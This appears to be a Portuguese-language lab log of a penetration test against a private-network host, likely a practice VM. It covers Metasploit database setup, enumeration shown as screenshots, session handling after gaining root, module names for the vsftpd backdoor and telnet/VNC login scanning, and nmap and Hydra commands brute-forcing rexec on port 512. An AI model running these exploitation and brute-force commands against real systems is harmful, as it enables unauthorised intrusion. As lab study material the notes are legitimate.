
# Conectando no Banco de Dados (Parte mais chata)

```bash
sudo apt install postgresql postgresql-contrib &&
sudo service postgresql start

msfdb init
```

## Dentro do MSFCONSOLE

```bash
msfconsole
db_connect msf:msf@127.0.0.1:5432/msf
```

---

## Criando Workspace desse Computador

![Criando Workspace](https://github.com/user-attachments/assets/c79ab59f-974d-4781-bb66-693c1e4cff30)

## Serviços

![Serviços](https://github.com/user-attachments/assets/e2602863-3e4e-426a-a54a-eca74d17c896)

## Informações de Host

![Informações de Host](https://github.com/user-attachments/assets/121e0dc0-f0ed-43af-81b0-7d5af6a9aaee)

## Procurando Diretórios Escondidos

![Diretórios Escondidos](https://github.com/user-attachments/assets/f4ec5416-ea24-4f5a-8234-1894a40596b9)

## Aprofundando

![Profundando 2](https://github.com/user-attachments/assets/fdf0e3c5-cae1-4044-a42e-541c8ab3ced3)

---

## Depois de conseguir acesso como root usando o payload:

```bash
CTRL + Z
Y

sessions        # Ver sessões ativas
sessions -i 2   # Acessar a sessão 2
```

![Sessão](https://github.com/user-attachments/assets/e4c0a2cc-9ec0-4e06-9f0f-3e3448ace42d)

---

## PAYLOADs

```text
cmd/unix/interact               => vsft 3.2.4
auxiliary/scanner/telnet_login => Telnet porta 23
scanner/vnc/vnc_login          => VNC (usar depois com: vncviewer 192.168.100.102:5900 :password)
```

## Força Bruta com Nmap e Hydra

```bash
nmap -p 512 --script rexec-brute -v 192.168.100.102

# Depois:
hydra -L /home/luan/Desktop/porta_512_logins/usuarios_512.txt \
      -P /home/luan/Desktop/porta_512_logins/passwd_512.txt \
      -vV 192.168.100.102 rexec
```
